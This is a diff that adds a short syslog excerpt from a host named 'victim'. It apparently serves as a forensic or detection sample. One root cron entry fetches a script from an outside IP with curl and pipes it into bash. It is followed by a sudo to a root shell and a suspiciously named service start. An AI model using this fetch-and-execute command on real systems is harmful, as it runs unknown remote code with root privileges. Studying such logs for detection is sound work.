@@ -1,0 +1,6 @@
+Jun  3 02:10:01 victim systemd[1]: Started Session 12 of user victim.
+Jun  3 02:12:01 victim CRON[2110]: (root) CMD (curl -fsSL http://185.220.101.47/x.sh | bash > /dev/null 2>&1)
+Jun  3 02:13:30 victim sudo[2231]:  victim : TTY=pts/0 ; PWD=/home/victim ; USER=root ; COMMAND=/bin/bash
+Jun  3 02:18:44 victim systemd[1]: Started D-Bus Update Helper.
+Jun  3 02:20:05 victim rsyslogd: [origin software="rsyslogd"] rsyslogd was HUPed
+Jun  3 05:01:11 victim systemd[1]: Starting Daily apt download activities...
